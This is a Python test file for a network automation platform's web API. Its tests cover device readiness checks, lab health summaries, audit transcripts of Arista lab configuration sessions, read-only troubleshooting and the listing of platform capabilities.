def test_readiness_devices_only_checks_selected_targets(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    readiness = client.post("/api/readiness/devices", json={"device_ids": ["v2-store2"]})

    assert readiness.status_code == 200
    body = readiness.json()
    assert body["requested"] == 1
    assert body["tested"] == 1
    assert {device["id"] for device in body["devices"]} == {"v2-store2"}


def test_readiness_excludes_unsupported_selected_target_before_collection(tmp_path: Path, monkeypatch):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)
    inventory_path = paths.inventories / "lab.yaml"
    inventory = read_yaml(inventory_path)
    inventory["devices"].append({
        "id": "ssh-test",
        "host": "127.0.0.1",
        "platform": "linux",
        "username": "ignored",
        "password": "ignored",
    })
    write_yaml(inventory_path, inventory)
    client = TestClient(api.app)

    readiness = client.post("/api/readiness/devices", json={"device_ids": ["ssh-test"]})

    assert readiness.status_code == 200
    body = readiness.json()
    assert body["tested"] == 0
    assert body["readable"] == 0
    assert body["excluded"] == 1
    assert body["devices"] == [
        {
            "id": "ssh-test",
            "host": "127.0.0.1",
            "platform": "linux",
            "site": None,
            "ok": False,
            "eligible": False,
            "error": "unsupported_platform:linux",
        }
    ]


def test_health_endpoint_returns_lab_summary_not_raw_dump(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)
    client = TestClient(api.app)

    health = client.get("/api/health")

    assert health.status_code == 200
    lab = health.json()["lab"]
    assert "stdout" not in lab
    assert "stderr" not in lab
    assert "message" in lab
    assert "running_nodes" in lab


def test_lab_summary_shapes_clab_output_into_counts():
    summary = api._lab_summary(
        {"ok": True, "stdout": "clab-arista-lab-v2-store1 ceos running 172.100.1.41\nclab-arista-lab-v2-store2 ceos running 172.100.1.42"}
    )

    assert summary["ok"] is True
    assert summary["running_nodes"] == 2
    assert "clab-arista-lab-v2-store1" in summary["nodes"]
    assert "stdout" not in summary
    assert "2 nodes running" in summary["message"]


def test_audit_sessions_endpoint_exposes_command_transcripts(tmp_path: Path, monkeypatch):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)
    store = PlatformStore(paths)
    change = store.create_change(paths.intents / "examples" / "add_guest_vlan.yaml", "v2-store1")
    job = store.create_job(change.id, "lab_apply")
    store.update_job(
        job.id,
        "completed",
        "applied",
        {
            "result": {
                "session_name": "netcode_unit",
                "evidence": {
                    "transcript": [
                        {"command": "configure session netcode_unit", "output": "ok"},
                        {"command": "commit", "output": "ok"},
                    ]
                },
            }
        },
    )

    response = TestClient(api.app).get("/api/audit/sessions")
    data = response.json()

    assert response.status_code == 200
    assert data["sessions"][0]["session_name"] == "netcode_unit"
    assert data["sessions"][0]["commands"][1]["command"] == "commit"


def test_audit_sessions_endpoint_exposes_direct_lab_result_transcripts(tmp_path: Path, monkeypatch):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)
    store = PlatformStore(paths)
    change = store.create_change(paths.intents / "examples" / "add_guest_vlan.yaml", "v2-store1")
    job = store.create_job(change.id, "lab_rollback")
    store.update_job(
        job.id,
        "completed",
        "rolled back",
        {
            "session_name": "netcode_direct",
            "evidence": {
                "session": {
                    "transcript": [
                        {"command": "configure session netcode_direct", "output": "ok"},
                        {"command": "no vlan 90", "output": "ok"},
                        {"command": "commit", "output": "ok"},
                    ]
                }
            },
        },
    )

    response = TestClient(api.app).get("/api/audit/sessions")
    data = response.json()

    assert response.status_code == 200
    assert data["sessions"][0]["session_name"] == "netcode_direct"
    assert data["sessions"][0]["commands"][1]["command"] == "no vlan 90"


def test_rez_collect_state_endpoint_accepts_device_only_request(monkeypatch, tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)

    class FakeRez:
        def collect_device_state(self, device):
            return {"ok": True, "device_id": device.id, "adapter": f"rez.{device.platform}"}

    class FakeRegistry:
        rez = FakeRez()

    monkeypatch.setattr(api, "AdapterRegistry", FakeRegistry)

    response = TestClient(api.app).post("/api/adapters/rez/collect-state", json={"device_id": "v2-store1"})

    assert response.status_code == 200
    assert response.json() == {"ok": True, "device_id": "v2-store1", "adapter": "rez.arista_eos"}


def test_troubleshoot_run_is_read_only_and_attaches_to_change(monkeypatch, tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)
    monkeypatch.chdir(tmp_path)
    change = PlatformStore(paths).create_change(paths.intents / "examples" / "add_guest_vlan.yaml", "v2-store1")

    class FakeRez:
        def collect_device_state(self, device):
            return {
                "ok": True,
                "device_id": device.id,
                "platform": device.platform,
                "adapter": f"rez.{device.platform}",
                "driver": "drivers.arista_eos.AsyncAristaEOSDriver",
                "state": {"layer2": {"vlans": [{"vlan_id": 90, "name": "GUEST_WIFI"}]}},
                "warnings": [],
                "errors": [],
                "collection_time": 0.01,
            }

    class FakeRegistry:
        rez = FakeRez()

    monkeypatch.setattr(api, "AdapterRegistry", FakeRegistry)

    response = TestClient(api.app).post(
        "/api/troubleshoot/run",
        json={
            "device_id": "v2-store1",
            "check": "vlans",
            "target": "90",
            "expected": "GUEST_WIFI",
            "change_id": change.id,
        },
    )
    body = response.json()
    events = PlatformStore(paths).list_workflow_events(change.id)

    assert response.status_code == 200
    assert body["ok"] is True
    assert body["device_config"] == "read_only_no_writes"
    assert body["change_event_recorded"] is True
    assert events[0].action == "troubleshoot"
    assert events[0].evidence["summary"]["matched_rows"] == 1


def test_app_route_serves_ui():
    response = TestClient(api.app).get("/app")

    assert response.status_code == 200
    expected_text = [
        "Netcode",
        "Closed-loop automation with diagnostics",
        "Automation, diagnostics, and approvals in one workflow",
        "Daily workspace",
        "Setup Wizard",
        "Advanced workflows",
        "Inventory",
        "Workflow Packs",
        "Plan",
        "Validate",
        "Apply",
        "Evidence",
        "Source of truth",
        "Discovery",
        "On-prem runners",
        "Credentials stay on the runner",
        "Writes require plan, policy gates, canary, approval, apply, and verification",
        "Live outcome",
        "Next safe action",
    ]
    for text in expected_text:
        assert text in response.text
    expected_contracts = [
        "runners-panel",
        "change-record",
        "config-json",
        "change-type-grid",
        "dynamic-fields",
    ]
    for marker in expected_contracts:
        assert marker in response.text
    assert "Create plan" in response.text
    assert "Run lab dry-run" in response.text
    assert "Apply in Arista lab" in response.text
    assert "Config" in response.text
    assert "Audit" in response.text


def test_platform_capabilities_exposes_all_core_deliverables(tmp_path: Path):
    paths = WorkspacePaths(tmp_path)
    init_workspace(paths)

    capabilities = platform_capabilities(paths)
    deliverables = capabilities["deliverables"]

    assert capabilities["ok"] is True
    assert len(deliverables) == 15
    assert [item["id"] for item in deliverables] == [
        "source_of_truth",
        "intent_model",
        "policy_guardrails",
        "config_generation",
        "validation_pipeline",
        "change_workflow",
        "device_adapters",
        "state_collection",
        "drift_detection",
        "evidence_audit",
        "approval_rbac",
        "rollback_plan",
        "lab_testing",
        "ui_api",
        "reports",
    ]


def test_platform_capabilities_endpoint(tmp_path: Path, monkeypatch):
    init_workspace(WorkspacePaths(tmp_path))
    monkeypatch.chdir(tmp_path)

    response = TestClient(api.app).get("/api/platform/capabilities")
    data = response.json()

    assert response.status_code == 200
    assert data["summary"] == "Safe, reviewable, evidence-backed network changes."
    assert len(data["deliverables"]) == 15
    assert data["support_matrix"]["schema"] == "rezonance.product-support.v1"
    assert len(data["support_matrix"]["rows"]) == len(READ_TRANSPORTS)
